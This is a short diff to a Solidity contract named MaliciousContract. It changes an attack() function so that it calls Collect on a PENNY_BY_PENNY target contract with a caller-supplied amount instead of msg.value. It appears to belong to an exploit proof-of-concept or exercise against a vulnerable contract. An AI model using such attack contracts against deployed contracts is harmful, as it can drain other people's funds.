@@ -9,9 +9,9 @@ contract MaliciousContract {
         penny_by_penny = PENNY_BY_PENNY(_penny_by_penny);
     }
 
-    function attack() public payable {
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        penny_by_penny.Collect(msg.value);
+    function attack(uint amount) public {
+        require(amount >= 1 ether, "Must send at least 1 ether");
+        penny_by_penny.Collect(amount);
     }
 
     function deposit(uint timeLock) public payable {
